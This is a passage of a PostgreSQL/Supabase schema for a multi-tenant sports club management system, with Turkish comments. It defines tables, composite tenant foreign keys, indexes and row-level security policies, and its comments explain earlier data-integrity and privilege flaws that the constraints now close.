  id uuid primary key default gen_random_uuid(),
  rota_id uuid not null references servis_rota(id) on delete cascade,
  ad text not null,
  sub text,
  saat text,
  sira int not null default 0,
  durum text not null default 'bekliyor' check (durum in ('gecti', 'suan', 'bekliyor')),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint servis_durak_id_kulup_uniq unique (id, kulup_id),
  constraint servis_durak_rota_kulup_fkey
    foreign key (rota_id, kulup_id) references servis_rota(id, kulup_id) on delete cascade
);

-- durak_id nullable → MATCH SIMPLE gereği durak_id NULL ise bileşik kısıt aranmaz.
create table servis_sporcu (
  rota_id uuid not null references servis_rota(id) on delete cascade,
  sporcu_id uuid not null references sporcular(id) on delete cascade,
  durak_id uuid references servis_durak(id),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  primary key (rota_id, sporcu_id),
  constraint servis_sporcu_rota_kulup_fkey
    foreign key (rota_id, kulup_id) references servis_rota(id, kulup_id) on delete cascade,
  constraint servis_sporcu_sporcu_kulup_fkey
    foreign key (sporcu_id, kulup_id) references sporcular(id, kulup_id) on delete cascade,
  constraint servis_sporcu_durak_kulup_fkey
    foreign key (durak_id, kulup_id) references servis_durak(id, kulup_id)
);

create table urun (
  id uuid primary key default gen_random_uuid(),
  ad text not null,
  aciklama text,
  kategori text not null check (kategori in ('Forma', 'Giyim', 'Aksesuar')),
  fiyat numeric not null,
  stok int not null default 0,
  aktif boolean not null default true,
  badge text,
  jersey boolean not null default false,
  sube_id uuid,
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint urun_id_kulup_uniq unique (id, kulup_id)
);

create table siparis (
  id uuid primary key default gen_random_uuid(),
  sporcu_id uuid not null references sporcular(id),
  tutar numeric not null,
  durum text not null default 'hazirlaniyor' check (durum in ('hazirlaniyor', 'hazir', 'teslim')),
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint siparis_id_kulup_uniq unique (id, kulup_id)
);

create table siparis_kalem (
  id uuid primary key default gen_random_uuid(),
  siparis_id uuid not null references siparis(id) on delete cascade,
  urun_id uuid not null references urun(id),
  beden text,
  -- 0036: negatif adet toplami da negatif yapardi ('-5 forma' ile siparisi
  -- bedavaya getirmek). Kisit yoktu.
  adet int not null default 1 check (adet > 0),
  -- 0036: bu deger ISTEMCIDEN KABUL EDILMIYOR; tetikleyici urun.fiyat'tan yaziyor.
  birim_fiyat numeric not null,
  not_metni text,
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint siparis_kalem_siparis_kulup_fkey
    foreign key (siparis_id, kulup_id) references siparis(id, kulup_id) on delete cascade,
  constraint siparis_kalem_urun_kulup_fkey
    foreign key (urun_id, kulup_id) references urun(id, kulup_id)
);


-- ===========================================================================
-- 9) BİREYSEL DERS / HAKEDİŞ / BAŞVURU
--    Kaynak: 0013, 0021 (kulup_id)
-- ===========================================================================

create table bireysel_antrenor (
  id uuid primary key default gen_random_uuid(),
  antrenor_id uuid not null unique references profiles(id) on delete cascade,
  brans_id uuid references brans(id),
  deneyim_yil int not null default 0,
  puan numeric(2,1),
  bio text,
  musait boolean not null default true,
  tek_fiyat numeric not null,
  paket_fiyat numeric not null,
  paket_ders_sayisi int not null default 10,
  varsayilan_tesis text,
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id)
);

create table bireysel_musaitlik (
  id uuid primary key default gen_random_uuid(),
  antrenor_id uuid not null references profiles(id) on delete cascade,
  gun_index int not null check (gun_index between 0 and 6),
  baslangic_saat text not null,
  bitis_saat text not null,
  aktif boolean not null default true,
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  unique (antrenor_id, gun_index)
);

create table bireysel_istisna (
  id uuid primary key default gen_random_uuid(),
  antrenor_id uuid not null references profiles(id) on delete cascade,
  tarih date not null,
  aciklama text,
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  unique (antrenor_id, tarih)
);

-- (antrenör, sporcu) skalasında — her paket satışı yeni satır, üzerine yazılmaz.
create table bireysel_paket (
  id uuid primary key default gen_random_uuid(),
  -- 0029: paket SPORCUNUNDUR; antrenör ayrılınca velinin ödediği ders hakkı
  -- silinmemeli.
  antrenor_id uuid references profiles(id) on delete set null,
  sporcu_id uuid not null references sporcular(id) on delete cascade,
  toplam int not null,
  kalan int not null check (kalan >= 0),
  tutar numeric not null,
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  -- 0041: TAVAN DA KISITTA. Tetikleyicideki least(kalan + 1, toplam) yalnızca
  -- İADE yolunu koruyordu; yöneticinin bireysel_paket üzerindeki DOĞRUDAN UPDATE
  -- politikası tetikleyiciden geçmiyor ve kalan = 99 yazılabiliyordu (ölçüldü).
  -- Kısıt veritabanı düzeyinde: hangi yoldan gelinirse gelinsin tutuyor.
  constraint bireysel_paket_kalan_tavan check (kalan <= toplam)
);

create table bireysel_rezervasyon (
  id uuid primary key default gen_random_uuid(),
  antrenor_id uuid references profiles(id) on delete set null,   -- 0029
  sporcu_id uuid not null references sporcular(id) on delete cascade,
  tarih date not null,
  saat text not null,
  sure_dk int not null default 60,
  tesis text,
  odeme_tipi text not null check (odeme_tipi in ('tek', 'paket')),
  paket_id uuid references bireysel_paket(id),
  tutar numeric not null,
  odeme_notu text,
  durum text not null default 'onay_bekliyor'
    check (durum in ('onay_bekliyor', 'onaylandi', 'reddedildi', 'tamamlandi', 'iptal', 'gelmedi')),
  sonuc_zamani timestamptz,
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  check ((odeme_tipi = 'paket' and paket_id is not null) or (odeme_tipi = 'tek' and paket_id is null))
);

-- Aynı antrenörün aynı saatini iki kişi kapamasın diye — reddedildi/iptal hariç.
-- Kiracı bazına çevrilmedi: antrenor_id zaten kulübe özel bir profildir.
create unique index bireysel_rezervasyon_slot_uniq on bireysel_rezervasyon (antrenor_id, tarih, saat)
  where durum not in ('reddedildi', 'iptal');

-- Hakediş — grup dersi bordrosu, gerçek antrenman satır sayısından hesaplanır.
create table antrenor_grup_ucret (
  id uuid primary key default gen_random_uuid(),
  antrenor_id uuid not null references profiles(id) on delete cascade,
  grup_id uuid not null references grup(id) on delete cascade,
  ders_ucreti numeric not null,
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  unique (antrenor_id, grup_id)
);

create table hakedis (
  id uuid primary key default gen_random_uuid(),
  -- 0029: BORDRO KAYDI KULÜBÜNDÜR. Eskiden cascade'di ve antrenör hesabı
  -- silinince tüm hakediş geçmişi sessizce siliniyordu.
  antrenor_id uuid references profiles(id) on delete set null,
  donem_ay date not null,
  tutar numeric not null default 0,
  odendi boolean not null default false,
  odendi_tarihi date,
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  unique (antrenor_id, donem_ay),
  constraint hakedis_id_kulup_uniq unique (id, kulup_id)
);

create table hakedis_kalem (
  id uuid primary key default gen_random_uuid(),
  hakedis_id uuid not null references hakedis(id) on delete cascade,
  grup_id uuid references grup(id),
  ders_sayisi int not null,
  birim_ucret numeric not null,
  tutar numeric not null,
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint hakedis_kalem_hakedis_kulup_fkey
    foreign key (hakedis_id, kulup_id) references hakedis(id, kulup_id) on delete cascade,
  constraint hakedis_kalem_grup_kulup_fkey
    foreign key (grup_id, kulup_id) references grup(id, kulup_id)
);

-- Başvurular — sporcu_id yalnızca başvuru onaylandığında doldurulur.
create table basvuru (
  id uuid primary key default gen_random_uuid(),
  ad text not null,
  dogum_yili int,
  brans_id uuid references brans(id),
  grup_id uuid references grup(id),
  sube_id uuid,
  veli_ad text,
  veli_telefon text,
  tag text not null check (tag in ('DENEME', 'KAYIT')),
  durum text not null default 'bekliyor' check (durum in ('bekliyor', 'onaylandi', 'reddedildi')),
  detay_notu text,
  sporcu_id uuid references sporcular(id),
  created_by uuid references profiles(id),
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id)
);


-- ===========================================================================
-- 10) MUHASEBE / AYARLAR / MOBİL BAYRAK / PUSH
--     Kaynak: 0014 (gider, fatura), 0015 (kurum_ayarlari), 0019 (mobil_ozellik),
--             0020 (push_token), 0021 (kulup_id + kiracı bazına çevrilen kısıtlar)
-- ===========================================================================

create table gider (
  id uuid primary key default gen_random_uuid(),
  tarih date not null default current_date,
  kategori text not null,
  aciklama text,
  tutar numeric not null,
  yontem text not null check (yontem in ('kart', 'havale', 'elden')),
  olusturan_id uuid references profiles(id),
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id)
);

-- 0021 bölüm 10.3: fatura_no'nun GLOBAL unique'i kiracı bazına çevrildi.
-- Fatura numarası admin-panel/.../faturalar/actions.ts'te `count(*) + 1` ile
-- üretiliyor; bu count restrictive politika yüzünden kulübe özel saydığından iki
-- kulüp kaçınılmaz olarak aynı 'FT-2026-0001' numarasını üretir. Global unique
-- kalsaydı ikinci kulübün ilk faturası patlardı.
create table fatura (
  id uuid primary key default gen_random_uuid(),
  fatura_no text not null,
  sporcu_id uuid not null references sporcular(id),
  tutar numeric not null,
  tarih date not null default current_date,
  durum text not null default 'bekliyor' check (durum in ('bekliyor', 'odendi')),
  olusturan_id uuid references profiles(id),
  created_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint fatura_kulup_fatura_no_key unique (kulup_id, fatura_no)
);

-- 0021 bölüm 10.1: `id boolean primary key check(id)` singleton'ı tabloda ömür
-- boyu TEK satıra izin veriyordu. `id` kolonu ve check(id) AYNEN KALIYOR, yalnızca
-- PRIMARY KEY (id) → (kulup_id) oldu: kulüp başına tam bir satır. Uygulamadaki
-- `.eq('id', true).single()` çağrıları AYNEN çalışır — restrictive politika zaten
-- yalnızca kendi kulübünün satırını gösterdiği için .single() tek satır bulur.
--
-- Not: kulup_adi varsayılanı 0015'te 'Karşıyaka Spor Okulu' idi; SaaS kurulumunda
-- demo kulüp adı taşınmaması için nötr bir varsayılana çekildi. Gerçek kulüp adı
-- 03_kulup_olustur.sql'de yazılır veya Ayarlar ekranından değiştirilir.
create table kurum_ayarlari (
  id boolean not null default true check (id),
  kulup_adi text not null default 'Spor Kulübü',
  telefon text,
  eposta text,
  adres text,
  para_birimi text not null default 'TRY' check (para_birimi in ('TRY', 'USD', 'EUR')),
  -- 0028: veli aidatını havale ile yatırıyor; nereye yatıracağı da bir yerde
  -- yazmalı. iban_sahibi ayrı bir alan çünkü bankalar havalede ad eşleşmesi
  -- ister, IBAN tek başına yetmez.
  iban text,
  iban_sahibi text,
  odeme_aciklamasi text,
  updated_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint kurum_ayarlari_pkey primary key (kulup_id)
);

-- Mobil özellik bayrakları — panelden aç/kapa. Bayrak seti sabittir; yeni bayrak
-- mobil tarafta karşılığı olan kod gerektirdiği için migration'la gelir.
-- Bayrak SATIRLARI kulübe aittir → 03_kulup_olustur.sql'de eklenir.
--
-- 0021 bölüm 10.2: `anahtar text primary key` GLOBAL benzersizdi → ikinci kulüp
-- 'mesajlar' bayrağını ekleyemezdi. PK artık (kulup_id, anahtar).
create table mobil_ozellik (
  anahtar text not null,
  ad text not null,
  aciklama text,
  aktif boolean not null default true,
  updated_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id),
  constraint mobil_ozellik_pkey primary key (kulup_id, anahtar)
);

-- Expo push token kaydı — cihaz başına tek satır (token primary key).
-- token PK'si bilinçli olarak GLOBAL kalıyor: token fiziksel bir cihazı temsil
-- eder, aynı cihaz iki kulüpte aynı anda kayıtlı olamaz (push_token_devral()
-- trigger'ı zaten eski satırı siliyor — bölüm 13.9).
create table push_token (
  token text primary key,
  user_id uuid not null references profiles(id) on delete cascade,
  platform text,
  updated_at timestamptz not null default now(),
  kulup_id uuid not null default private.current_kulup_id() references kulup(id)
);


-- ===========================================================================
-- 11) DAVET (ÇOK KİRACILI KAYIT AKIŞI)
--     Kaynak: 0022
-- ===========================================================================
-- Bir davet = "şu kulübe, şu rolle, (varsa) şu sporcunun velisi olarak katıl"
-- iznidir. Tek kullanımlıktır: kullanildi_at dolduktan sonra token ölür.
--
-- NEDEN GEREKLİ: birden fazla kulüp varken handle_new_user yeni kullanıcının
-- hangi kulübe ait olduğunu çözemez. Kulüp VE rol bilgisi token'ın işaret ettiği
-- DAVET KAYDINDAN gelir, istemciden değil — 0016'nın rol yükseltme koruması
-- böylece korunur (ayrıntı bölüm 13.2).

-- Token varsayılanı gen_random_bytes(16) kullanıyor; bu fonksiyon çekirdekte
-- DEĞİL, pgcrypto eklentisindedir. Supabase projelerinde pgcrypto varsayılan
-- olarak `extensions` şemasında KURULUDUR, dolayısıyla aşağıdaki blok normalde
-- hiçbir şey yapmaz — yalnızca bağımlılığı belgeliyor ve boş bir projede
-- kurulumun anlaşılmaz bir "function does not exist" hatasıyla patlamasını
-- engelliyor.
do $$
begin
  if not exists (select 1 from pg_extension where extname = 'pgcrypto') then
    if exists (select 1 from pg_namespace where nspname = 'extensions') then
      execute 'create extension pgcrypto with schema extensions';
    else
      execute 'create extension pgcrypto';
    end if;
    raise notice '01_sema: pgcrypto eklentisi kuruldu.';
  end if;
end
$$;

-- KOLON GEREKÇELERİ (0022 bölüm 1)
--   token         PK. Linkin kendisi. 16 rastgele bayt → 32 karakter hex →
--                 2^128 olasılık. UUID yerine hex: URL'de tire yok.
--   eposta        Doluysa davet O adrese bağlıdır (bkz. private.davet_coz).
--   sporcu_id     Veli daveti belirli bir sporcuya bağlanabilir; kayıt anında
--                 veli_sporcu bağı otomatik kurulur.
--   davet_notu    Kolon adı bilinçli olarak `not` DEĞİL: NOT ayrılmış anahtar
--                 kelimedir, her sorguda çift tırnak gerektirirdi. Şemanın mevcut
--                 deseni de sonek kullanıyor (odeme_notu, sonuc_notu, detay_notu).
--
-- FK davranışları:
--   kulup_id  cascade  — kulüp silinirse davetleri de gider.
--   sporcu_id set null — sporcu silinse bile davet linki ölmez, bağ düşer.
--   olusturan_id / kullanan_id set null — denetim izi kalsın, referans boşalsın.
--
-- NOT: sporcu_id ayağında BİLEŞİK FK yok — `on delete set null` bileşik FK'de HER
-- İKİ kolonu da NULL yapar, kulup_id ise NOT NULL. Aynı garanti bölüm 13.4'teki
-- protect_davet_sporcu() trigger'ı ile sağlanıyor.
create table davet (
  token         text primary key default encode(gen_random_bytes(16), 'hex'),
  kulup_id      uuid not null default private.current_kulup_id() references kulup(id) on delete cascade,
  rol           app_role not null default 'veli',
  ad            text,
  eposta        text,
  sporcu_id     uuid references sporcular(id) on delete set null,
  son_kullanma  timestamptz not null default now() + interval '14 days',
  kullanildi_at timestamptz,
  kullanan_id   uuid references profiles(id) on delete set null,
  olusturan_id  uuid default auth.uid() references profiles(id) on delete set null,
  davet_notu    text,
  created_at    timestamptz not null default now(),
  -- platform_admin YASAK: davet yolu platform sahipliğine yükselmek için
  -- kullanılamaz. Beyaz liste yazıldı (rol <> 'platform_admin' değil) — enum'a
  -- ileride yeni bir ayrıcalıklı rol eklenirse davet edilebilir hale GELMESİN.
  constraint davet_rol_check check (rol in ('veli', 'antrenor', 'muhasebeci', 'yonetici')),
  -- sporcu bağı yalnızca veli davetinde anlamlı.
  constraint davet_sporcu_rol_check check (sporcu_id is null or rol = 'veli')
);


-- ===========================================================================
-- 11.9  ŞUBE: KİRACI BÜTÜNLÜĞÜ, İNDEKSLER, BENZERSİZ AD   (kaynak: 0038 + 0039)
-- ===========================================================================
-- NEDEN BİLEŞİK FK — düz `references sube(id)` YETMEZ.
--   Düz FK yalnızca "böyle bir şube var mı" diye sorar, "BENİM kulübümün şubesi
--   mi" diye sormaz. Bir kulüp yöneticisi başka kulübün şube UUID'sini bilirse
--   kendi sporcusunu O şubeye etiketleyebilirdi. RLS bunu yakalamıyor: WITH
--   CHECK yalnızca kulup_id'ye bakıyor, sube_id'ye bakmıyor.
--
--   Zararı, şube filtreleri devreye girdiği anda somutlaşıyor: yabancı şubeye
--   etiketlenmiş sporcu kendi kulübünün şube filtresinde KAYBOLUR — sessiz veri
--   kaybı. Çözüm 0021'in bağ tablolarındaki desenin aynısı; `sube` üzerindeki
--   (id, kulup_id) benzersizliği zaten var (sube_id_kulup_uniq).
--
-- NEDEN `on delete set null (sube_id)` — KOLON LİSTESİ ŞART.
--   Kolonsuz `on delete set null` bileşik FK'nin TÜM kolonlarını NULL yapar,
--   yani kulup_id'yi de. kulup_id NOT NULL olduğu için şube silme şu hatayla
--   reddediliyordu:
--       null value in column "kulup_id" of relation "sporcular"
--       violates not-null constraint
--   Sonuç: içinde tek bir sporcu bile olan şube SİLİNEMİYORDU. Kolon listeli
--   biçim (PostgreSQL 15+) yalnızca sube_id'yi boşaltır. Bu tam olarak istenen
--   davranış: şube kapanır, sporcular şubesiz kalır ama SİLİNMEZ.
--
-- SÜRÜM ŞARTI: PostgreSQL 15+. Supabase bunu karşılıyor.

alter table sporcular   add constraint sporcular_sube_kulup_fkey
  foreign key (sube_id, kulup_id) references sube(id, kulup_id) on delete set null (sube_id);
alter table grup        add constraint grup_sube_kulup_fkey
  foreign key (sube_id, kulup_id) references sube(id, kulup_id) on delete set null (sube_id);
alter table aidat_plani add constraint aidat_plani_sube_kulup_fkey
  foreign key (sube_id, kulup_id) references sube(id, kulup_id) on delete set null (sube_id);
alter table urun        add constraint urun_sube_kulup_fkey
  foreign key (sube_id, kulup_id) references sube(id, kulup_id) on delete set null (sube_id);
alter table servis_rota add constraint servis_rota_sube_kulup_fkey
  foreign key (sube_id, kulup_id) references sube(id, kulup_id) on delete set null (sube_id);
alter table basvuru     add constraint basvuru_sube_kulup_fkey
  foreign key (sube_id, kulup_id) references sube(id, kulup_id) on delete set null (sube_id);

-- İNDEKSLER. Şube filtresi her listede `kulup_id = ? and sube_id = ?` biçiminde
-- çalışıyor; kiracı duvarı kulup_id predicate'ini zaten ekliyor. Bileşik indeks
-- ikisini birden karşılar. İndekssiz kalırsa restrictive politika her sorguda
-- seq scan'e döner (0021 bölüm 8 ile aynı gerekçe).
create index if not exists sporcular_kulup_sube_idx   on sporcular   (kulup_id, sube_id);
create index if not exists grup_kulup_sube_idx        on grup        (kulup_id, sube_id);
create index if not exists aidat_plani_kulup_sube_idx on aidat_plani (kulup_id, sube_id);
create index if not exists urun_kulup_sube_idx        on urun        (kulup_id, sube_id);

-- ŞUBE ADI KULÜP İÇİNDE BENZERSİZ. İki "Merkez" şubesi, filtrede hangisinin
-- seçildiğini anlaşılmaz kılar ve raporu ikiye böler. Kulüp bazında yeterli:
-- iki farklı kulüp elbette "Merkez" adını kullanabilir.
create unique index if not exists sube_kulup_ad_uniq on sube (kulup_id, ad);


-- ===========================================================================
-- 12) ROW LEVEL SECURITY
-- ===========================================================================
-- 47 tablonun tamamında RLS açık. İki katman:
--   12.1–12.12  ROL POLİTİKALARI (permissive, 161 adet) — 0001–0020'nin nihai
--               hâli + kulup ve davet tablolarının kendi politikaları + 0025'in
--               antrenör maç sonucu politikası.
--               · 0016'nın drop+recreate ettiği etkinlik / yoklama(veli insert) /
--                 bireysel_rezervasyon(antrenör update) / profiles(update)
--                 politikaları yalnızca 0016 sonrası hâliyle,
--               · 0015'in `alter policy` ile muhasebeciye açtığı odeme /
--                 aidat_plani / gider / fatura politikaları genişletilmiş hâliyle.
--   12.13       KİRACI DUVARI (restrictive, 55 adet) — 0021 bölüm 9 + 0022 3.1.
--
-- PostgreSQL permissive politikaları OR ile, restrictive politikaları AND ile
-- birleştirir:  erişim = (rol kuralları OR'lanmış) AND (kulup_id eşleşmesi)
-- Böylece rol mantığı aynen korunur, üstüne kiracı duvarı biner.

alter table kulup                   enable row level security;
alter table profiles                enable row level security;
alter table sube                    enable row level security;
alter table brans                   enable row level security;
alter table hizmet_turu             enable row level security;
alter table kurum_brans_secimi      enable row level security;
alter table kurum_hizmet_turu_secimi enable row level security;
alter table grup                    enable row level security;
alter table sporcular               enable row level security;
alter table veli_sporcu             enable row level security;
alter table sporcu_antrenor         enable row level security;
alter table aidat_plani             enable row level security;
alter table odeme                   enable row level security;
alter table antrenman               enable row level security;
alter table yoklama                 enable row level security;
alter table beceri                  enable row level security;
alter table gelisim_degerlendirme   enable row level security;
alter table gelisim_beceri_seviye   enable row level security;
alter table duyuru                  enable row level security;
alter table duyuru_hedef            enable row level security;
alter table etkinlik                enable row level security;
alter table etkinlik_katilim        enable row level security;
alter table mac_kadro               enable row level security;
alter table mac_kadro_sporcu        enable row level security;
alter table konusma                 enable row level security;
alter table mesaj                   enable row level security;
alter table servis_rota             enable row level security;
alter table servis_durak            enable row level security;
alter table servis_sporcu           enable row level security;
alter table urun                    enable row level security;
alter table siparis                 enable row level security;
alter table siparis_kalem           enable row level security;
alter table bireysel_antrenor       enable row level security;
alter table bireysel_musaitlik      enable row level security;
alter table bireysel_istisna        enable row level security;
alter table bireysel_paket          enable row level security;
alter table bireysel_rezervasyon    enable row level security;
alter table antrenor_grup_ucret     enable row level security;
alter table hakedis                 enable row level security;
alter table hakedis_kalem           enable row level security;
alter table basvuru                 enable row level security;
alter table gider                   enable row level security;
alter table fatura                  enable row level security;
alter table kurum_ayarlari          enable row level security;
alter table mobil_ozellik           enable row level security;
alter table push_token              enable row level security;
alter table davet                   enable row level security;


-- ---------------------------------------------------------------------------
-- 12.1 kulup  (0021)
-- ---------------------------------------------------------------------------
-- Kullanıcı YALNIZCA kendi kulübünün satırını okur (kulüp adı / plan gösterimi
-- için). Yazma politikası bilinçli olarak YOK: kulüp açma-kapama, plan ve
-- abonelik değişikliği yalnızca service_role ile (süper-admin paneli) yapılır;
-- service_role BYPASSRLS olduğu için politika gerekmez.
create policy "kulup: kullanıcı kendi kulübünü okur"
  on kulup for select
  using (id = (select private.current_kulup_id()));


-- ---------------------------------------------------------------------------
-- 12.2 profiles  (0001 + 0010 + 0013 + 0016)
-- ---------------------------------------------------------------------------
create policy "profiles: kullanıcı kendi profilini okur"
  on profiles for select
  using (auth.uid() = id);

-- 0016: 0001'deki politikada WITH CHECK yoktu — role yükseltmesine açıktı.
-- WITH CHECK + protect_profile_role() trigger'ı (bölüm 13.3) birlikte kapatır.
create policy "profiles: kullanıcı kendi profilini günceller"
  on profiles for update
  using (auth.uid() = id)
  with check (auth.uid() = id);

-- 0010: yeni sohbet rehberi + konuşma listesinde karşı tarafın adı için.
create policy "profiles: veli kendi antrenörünü görür" on profiles for select
  using (
    exists (
      select 1 from sporcu_antrenor sa join veli_sporcu vs on vs.sporcu_id = sa.sporcu_id
      where sa.antrenor_id = profiles.id and vs.veli_id = auth.uid()
    )
  );
create policy "profiles: antrenör bağlı velisini görür" on profiles for select
  using (
    exists (
      select 1 from sporcu_antrenor sa join veli_sporcu vs on vs.sporcu_id = sa.sporcu_id
      where vs.veli_id = profiles.id and sa.antrenor_id = auth.uid()
    )
  );

-- 0013: hakediş ekranı gerçek antrenör adını profiles'tan join'lemek zorunda.
-- Kiracı duvarı olmasaydı bu politika BAŞKA kulüplerin kullanıcılarını da
-- listelerdi (0021 bölüm 9.1 notu).
create policy "profiles: yönetici tümünü görür" on profiles for select
  using (private.current_profile_role() = 'yonetici');


-- ---------------------------------------------------------------------------
-- 12.3 Kurum kataloğu: sube / brans / hizmet_turu / kurum_*_secimi / grup  (0004)
--      Desen: giriş yapan herkes okur, yalnızca yönetici yazar.
-- ---------------------------------------------------------------------------
create policy "sube: giriş yapan herkes okur" on sube for select using (auth.uid() is not null);
create policy "sube: yönetici yazar" on sube for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

create policy "brans: giriş yapan herkes okur" on brans for select using (auth.uid() is not null);
create policy "brans: yönetici yazar" on brans for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

create policy "hizmet_turu: giriş yapan herkes okur" on hizmet_turu for select using (auth.uid() is not null);
create policy "hizmet_turu: yönetici yazar" on hizmet_turu for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

create policy "kurum_brans_secimi: giriş yapan herkes okur" on kurum_brans_secimi for select using (auth.uid() is not null);
create policy "kurum_brans_secimi: yönetici yazar" on kurum_brans_secimi for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

create policy "kurum_hizmet_turu_secimi: giriş yapan herkes okur" on kurum_hizmet_turu_secimi for select using (auth.uid() is not null);
create policy "kurum_hizmet_turu_secimi: yönetici yazar" on kurum_hizmet_turu_secimi for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

create policy "grup: giriş yapan herkes okur" on grup for select using (auth.uid() is not null);
create policy "grup: yönetici yazar" on grup for all
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');


-- ---------------------------------------------------------------------------
-- 12.4 sporcular / veli_sporcu / sporcu_antrenor  (0004 + 0015 + 0018)
-- ---------------------------------------------------------------------------
create policy "sporcular: yönetici tümünü görür" on sporcular for select
  using (private.current_profile_role() = 'yonetici');
create policy "sporcular: antrenör bağlı olduklarını görür" on sporcular for select
  using (exists (select 1 from sporcu_antrenor sa where sa.sporcu_id = sporcular.id and sa.antrenor_id = auth.uid()));
create policy "sporcular: veli bağlı olduklarını görür" on sporcular for select
  using (exists (select 1 from veli_sporcu vs where vs.sporcu_id = sporcular.id and vs.veli_id = auth.uid()));
-- 0015: muhasebe sayfalarındaki sporcu adı join'leri ve seçim dropdown'ları için.
create policy "sporcular: muhasebeci tümünü görür" on sporcular for select
  using (private.current_profile_role() = 'muhasebeci');
create policy "sporcular: yönetici ekler/günceller" on sporcular for insert
  with check (private.current_profile_role() = 'yonetici');
create policy "sporcular: yönetici günceller" on sporcular for update
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');

create policy "veli_sporcu: yönetici tümünü görür" on veli_sporcu for select
  using (private.current_profile_role() = 'yonetici');
create policy "veli_sporcu: veli kendi bağını görür" on veli_sporcu for select
  using (veli_id = auth.uid());
create policy "veli_sporcu: yönetici yazar" on veli_sporcu for insert
  with check (private.current_profile_role() = 'yonetici');
create policy "veli_sporcu: yönetici siler" on veli_sporcu for delete
  using (private.current_profile_role() = 'yonetici');

create policy "sporcu_antrenor: yönetici tümünü görür" on sporcu_antrenor for select
  using (private.current_profile_role() = 'yonetici');
create policy "sporcu_antrenor: antrenör kendi bağını görür" on sporcu_antrenor for select
  using (antrenor_id = auth.uid());
-- 0018: veli, çocuğunun antrenörünü göremiyordu (ana sayfa / gelişim / mesaj rehberi).
create policy "sporcu_antrenor: veli bağlı sporcusunun antrenörünü görür" on sporcu_antrenor for select
  using (exists (
    select 1 from veli_sporcu vs
    where vs.sporcu_id = sporcu_antrenor.sporcu_id and vs.veli_id = auth.uid()
  ));
create policy "sporcu_antrenor: yönetici yazar" on sporcu_antrenor for insert
  with check (private.current_profile_role() = 'yonetici');
create policy "sporcu_antrenor: yönetici siler" on sporcu_antrenor for delete
  using (private.current_profile_role() = 'yonetici');


-- ---------------------------------------------------------------------------
-- 12.5 aidat_plani / odeme  (0007, 0015 ile muhasebeciye genişletilmiş)
-- ---------------------------------------------------------------------------
create policy "aidat_plani: giriş yapan herkes okur" on aidat_plani for select using (auth.uid() is not null);
create policy "aidat_plani: yönetici yazar" on aidat_plani for all
  using (private.current_profile_role() in ('yonetici', 'muhasebeci'))
  with check (private.current_profile_role() in ('yonetici', 'muhasebeci'));

create policy "odeme: yönetici tümünü görür" on odeme for select
  using (private.current_profile_role() in ('yonetici', 'muhasebeci'));
create policy "odeme: veli bağlı sporcusunu görür" on odeme for select
  using (exists (select 1 from veli_sporcu vs where vs.sporcu_id = odeme.sporcu_id and vs.veli_id = auth.uid()));
create policy "odeme: yönetici yazar" on odeme for insert
  with check (private.current_profile_role() in ('yonetici', 'muhasebeci'));
create policy "odeme: yönetici günceller" on odeme for update
  using (private.current_profile_role() in ('yonetici', 'muhasebeci'))
  with check (private.current_profile_role() in ('yonetici', 'muhasebeci'));


-- ---------------------------------------------------------------------------
-- 12.6 antrenman / yoklama / beceri / gelişim  (0008 + 0012 + 0016)
-- ---------------------------------------------------------------------------
create policy "antrenman: yönetici tümünü görür" on antrenman for select
  using (private.current_profile_role() = 'yonetici');
create policy "antrenman: antrenör kendi grubunu görür" on antrenman for select
  using (exists (
    select 1 from sporcu_antrenor sa join sporcular s on s.id = sa.sporcu_id
    where s.grup_id = antrenman.grup_id and sa.antrenor_id = auth.uid()
  ));
create policy "antrenman: veli bağlı sporcusunun grubunu görür" on antrenman for select
  using (exists (
    select 1 from veli_sporcu vs join sporcular s on s.id = vs.sporcu_id
    where s.grup_id = antrenman.grup_id and vs.veli_id = auth.uid()
  ));
create policy "antrenman: yönetici yazar" on antrenman for insert
  with check (private.current_profile_role() = 'yonetici');
create policy "antrenman: yönetici günceller" on antrenman for update
  using (private.current_profile_role() = 'yonetici') with check (private.current_profile_role() = 'yonetici');
create policy "antrenman: antrenör kendi grubunu günceller" on antrenman for update
  using (exists (
    select 1 from sporcu_antrenor sa join sporcular s on s.id = sa.sporcu_id
    where s.grup_id = antrenman.grup_id and sa.antrenor_id = auth.uid()
  ))
  with check (exists (
    select 1 from sporcu_antrenor sa join sporcular s on s.id = sa.sporcu_id
    where s.grup_id = antrenman.grup_id and sa.antrenor_id = auth.uid()
  ));

create policy "yoklama: yönetici tümünü görür" on yoklama for select
